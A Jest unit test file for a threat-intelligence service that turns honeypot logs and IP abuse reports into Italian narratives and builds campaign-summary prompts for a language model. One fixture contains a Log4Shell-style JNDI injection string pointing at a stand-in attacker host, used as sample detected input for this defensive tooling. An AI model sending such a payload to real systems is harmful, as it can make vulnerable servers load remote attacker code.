import 'reflect-metadata';
import { container } from 'tsyringe';
import mongoose from 'mongoose';
import { RagTranslationService } from '../RagTranslationService';
import { LOGGER_TOKEN } from '../../../di/tokens';
import ThreatLog from '../../../models/ThreatLogSchema';
import IpDetails from '../../../models/IpDetailsSchema';
import AbuseIpDb from '../../../models/AbuseIpDbSchema';
import AbuseReport from '../../../models/AbuseReportSchema';
import { performance } from 'perf_hooks';

describe('RagTranslationService Unit Test', () => {
    let service: RagTranslationService;
    let mockLogger: any;

    beforeEach(() => {
        container.reset();
        mockLogger = {
            info: jest.fn(),
            error: jest.fn(),
            warn: jest.fn(),
            debug: jest.fn()
        };
        container.registerInstance(LOGGER_TOKEN, mockLogger);
        service = container.resolve(RagTranslationService);
    });

    describe('Performance and Efficiency', () => {
        it('should translate 1000 logs in less than 500ms (Efficiency Test)', () => {
            const mockLog = {
                timestamp: new Date(),
                request: { ip: '1.2.3.4', method: 'GET' },
                protocol: 'http',
                fingerprint: { score: 50, suspicious: true }
            };

            const start = performance.now();
            for (let i = 0; i < 1000; i++) {
                service.translateThreatLog(mockLog as any);
            }
            const end = performance.now();
            const duration = end - start;

            console.log(`[PERF] Traduzione di 1000 ThreatLog completata in: ${duration.toFixed(2)}ms`);
            expect(duration).toBeLessThan(500);
        });
    });

    describe('Effectiveness (Correctness of Narrative)', () => {
        it('should correctly translate a complex ThreatLog with JNDI payload', () => {
            const log = {
                timestamp: new Date('2026-05-01T12:00:00Z'),
                request: { 
                    ip: '1.2.3.4', 
                    method: 'POST', 
                    jndiPayload: '${jndi:ldap://attacker.com/a}' 
                },
                protocol: 'http',
                geo: { country: 'Russia', city: 'Moscow', isp: 'Evil ISP' },
                fingerprint: { score: 85, suspicious: true, indicators: ['JNDI_DETECTED', 'TOR_EXIT'] }
            };

            const narrative = service.translateThreatLog(log as any);

            expect(narrative).toContain('1.2.3.4');
            expect(narrative).toContain('Russia');
            expect(narrative).toContain('85/100');
            expect(narrative).toContain('payload JNDI malevolo');
            expect(narrative).toContain('JNDI_DETECTED, TOR_EXIT');
            expect(narrative).toContain('sospetta');
        });

        it('should correctly translate IpDetails with AbuseData and filtered comments', () => {
            const ipDetails = {
                ip: '8.8.8.8',
                firstSeenAt: new Date('2026-01-01T00:00:00Z'),
                lastSeenAt: new Date('2026-05-01T00:00:00Z'),
                ipinfo: { org: 'Google LLC' }
            };

            const abuseData = {
                abuseConfidenceScore: 95,
                totalReports: 150,
                isTor: true
            };

            const abuseReports = [
                { comment: 'Fail2Ban ban triggered for sshd', reportedAt: new Date() }, // Spam - should be filtered
                { comment: 'Attempting to access .env files via web', reportedAt: new Date() }, // Semantic - keep
                { comment: 'SSH bruteforce attack detected', reportedAt: new Date() }, // Semantic - keep
                { comment: 'bad ip', reportedAt: new Date() }, // Too short - filter
                { comment: 'Port scan detected by honeypot', reportedAt: new Date() } // Spam - filter
            ];

            const narrative = service.translateIpDetails(ipDetails as any, abuseData as any, abuseReports as any);

            expect(narrative).toContain('8.8.8.8');
            expect(narrative).toContain('Google LLC');
            expect(narrative).toContain('95/100');
            expect(narrative).toContain('nodo di uscita TOR');
            
            // Verifica filtri semantici
            expect(narrative).toContain('.env files');
            expect(narrative).toContain('SSH bruteforce');
            
            // Verifica che lo spam sia stato rimosso
            expect(narrative).not.toContain('Fail2Ban');
            expect(narrative).not.toContain('bad ip');
            expect(narrative).not.toContain('Port scan');
        });
    });

    describe('Generative Prompt Builder', () => {
        it('should build a valid prompt for campaign summarization', () => {
            const campaignData = {
                campaignId: 'CMP-001',
                ipCount: 12,
                topIps: ['1.1.1.1', '2.2.2.2'],
                protocols: ['ssh']
            };

            const prompt = service.buildCampaignSummaryPrompt(campaignData);

            expect(prompt).toContain('Campagna di Attacco Distribuita');
            expect(prompt).toContain('CMP-001');
            expect(prompt).toContain('12');
            expect(prompt).toContain('--- INIZIO DATI JSON DELLA CAMPAGNA ---');
        });
    });
});
